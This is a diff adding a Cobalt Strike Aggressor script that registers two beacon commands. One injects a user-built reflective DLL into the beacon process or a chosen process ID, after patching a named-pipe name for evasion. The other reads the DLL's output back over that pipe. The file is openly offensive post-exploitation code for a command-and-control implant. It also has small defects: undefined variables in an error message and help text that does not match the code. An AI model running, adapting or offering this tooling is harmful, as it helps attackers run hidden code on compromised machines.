@@ -1,0 +1,133 @@
+# bpsinject($1, 1234, x64, "[System.Diagnostics.Process]::GetCurrentProcess()");
+# powerpick $pipe = New-Object IO.Pipes.NamedPipeClientStream('.', 'macrohard_updates', [IO.Pipes.PipeDirection]::In); $pipe.Connect(10000); $reader = New-Object IO.StreamReader($pipe); while(($line = $reader.ReadLine()) -ne $null){Write-Output $line}; $reader.Close(); $pipe.Close()
+
+import beacon.CommandBuilder;
+
+global('$pipe_wait $pipe_name_generic $pipe_stomp_me_name');
+$pipe_name_generic = "macrohard_updates"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
+$pipe_wait = 30000; # Custom timeout
+$pipe_stomp_me_name = "RDLL_PIPE_NAME_NO_CHANGE_PLS";
+
+# $1 - beacon id
+# $2 - process id of injection target (optional)
+alias rdll-exec {
+    local('$barch $beacon_id $pid $rdll_path $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name');
+    $beacon_id = $1;
+    $pid = $2; # Optional pid
+    # Get current beacon info
+    $barch = beacon_info($beacon_id, "barch");
+
+    if ($barch != "x64") {
+        berror($1, "This script only supports x64 processes");
+        return;
+    }
+
+    # If pid was not passed in, local injection
+    if ($pid == $null){
+        $pid = beacon_info($beacon_id, "pid");
+    }
+
+    # Build rdll path; This needs rework if you want to support x86 for whatever reason
+    $rdll_path = getFileProper(script_resource("."), "target", "release", "dll_rs.shc.dll");
+
+    # Get rdll contents
+    $handle = openf($rdll_path);
+    $rdll = readb($handle, -1);
+
+    # Close handle
+    closef($handle);
+
+    $actual_pipe_name = $pipe_name_generic; # 28 bytes by initial design
+    $desired_length = "28"; # per DLL design
+    $padding_needed = $desired_length - strlen($actual_pipe_name);
+    $padded_pipe_name = $actual_pipe_name;
+
+    if ($padding_needed > 0) {
+        $null_padding = "";
+        $i = 0;
+        while ($i < $padding_needed) {
+            $null_padding = $null_padding . chr(0); # Append an actual null byte
+            $i = $i + 1;
+        }
+        $padded_pipe_name = $actual_pipe_name . $null_padding;
+    } else if ($padding_needed < 0) {
+        berror($beacon_id, "Pipe name '" . $pipe_name_generic_actual . "' is longer than max " . $max_pipe_name_len . " bytes!");
+        return; # Important to return if name is too long
+    }
+    println("ORIGINAL PIPENAME: " . $pipe_stomp_me_name);
+    println("NEW PIPENAME: " . $padded_pipe_name);
+
+    # Now use $padded_pipe_name in strrep
+    $rdll = strrep($rdll, $pipe_stomp_me_name, $padded_pipe_name);
+
+    # Open output handle
+    $handle = openf(">" . $rdll_path);
+
+    # Write rdll back down
+    writeb($handle, $rdll);
+
+    # Close handle
+    closef($handle);
+
+    # self-inject the dll
+    bshinject($beacon_id, $pid, $barch, $rdll_path);
+
+}
+
+# $1 - beacon id
+# $2 - process id of injection target (optional)
+alias rdll-read {
+    local('$barch $beacon_id $pid $cmd $builder $job_type $callback_type $description $job');
+    $beacon_id = $1;
+    $pid = $2; # Optional pid
+    $job_type = 40;
+    $callback_type = 32;
+    $description = "pipe read";
+
+    # Get current beacon info
+    $barch = beacon_info($beacon_id, "barch");
+
+    if ($barch != "x64") {
+        berror($1, "This script only supports x64 processes");
+        return;
+    }
+
+    # If pid was not passed in, local injection
+    if ($pid == $null){
+        $pid = beacon_info($beacon_id, "pid");
+    }
+
+    # Use command builder to read from pipe
+    $builder = [new CommandBuilder];
+    [$builder setCommand: $job_type];
+    [$builder addInteger: parseNumber($pid)];
+    [$builder addShort: $callback_type];
+    [$builder addShort: $pipe_wait];
+    [$builder addLengthAndString: "\\\\.\\pipe\\" . $pipe_name_generic];
+    [$builder addLengthAndString: $description];
+    $job = [$builder build];
+    call("beacons.task", $null, $beacon_id, cast($job, 'b'));
+}
+
+# --------------------
+# Register the command
+# --------------------
+beacon_command_group(
+	"rdll_dlls",
+	"User-Defined Reflective DLLs",
+	"Collection of user-implemented reflective DLLs that enable advanced post-exploitation activities."
+);
+
+beacon_command_register(
+	"rdll-exec",
+	"(64-bit only) Executes user implemented reflective DLL via 'bdllinject' aggressor function in the local process (default).\n Output of the DLL can be read via rdll-read.",
+	"rdll-exec <optional: pid>",
+	"rdll_dlls"
+);
+
+beacon_command_register(
+	"rdll-read",
+	"(64-bit only) Reads output of a user implemented reflective DLL via 'bpsinject' aggressor function in the local process (default).",
+	"rdll-exec <optional: pid>",
+	"rdll_dlls"
+);
